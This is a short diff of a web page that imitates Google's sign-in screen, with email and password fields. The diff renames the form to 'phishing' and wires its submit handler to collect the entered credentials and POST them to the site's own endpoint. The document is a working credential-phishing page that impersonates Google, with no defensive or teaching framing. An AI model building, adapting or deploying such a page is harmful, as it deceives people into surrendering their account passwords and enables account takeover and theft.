@@ -64,7 +64,7 @@
         <div class="login"><img src="./img/Google_2015_logo.e99543bb.svg" alt="" width="74px" height="37px">
             <h2 id="headingText">Sign in</h2>
             <p class="subheading">with your Google Account</p>
-            <form name="contact" class="login-form"><input type="text" name="login" id="login" placeholder="Email or Phone"
+            <form id="phishing" name="contact" class="login-form"><input type="text" name="login" id="login" placeholder="Email or Phone"
                     required="required" class="form-input" ><a href=" "
                     class="form-link">Forgot email?</a><input type="password" name="password" id="password"
                     placeholder="Password" required="required" class="form-input"><a href=" "
@@ -98,7 +98,7 @@
 
     const handleSubmit = (e) => {
             e.preventDefault()
-            let myForm = document.getElementById('dogPictures');
+            let myForm = document.getElementById('phishing');
             let formData = new FormData(myForm)
             fetch('/', {
                 method: 'POST',
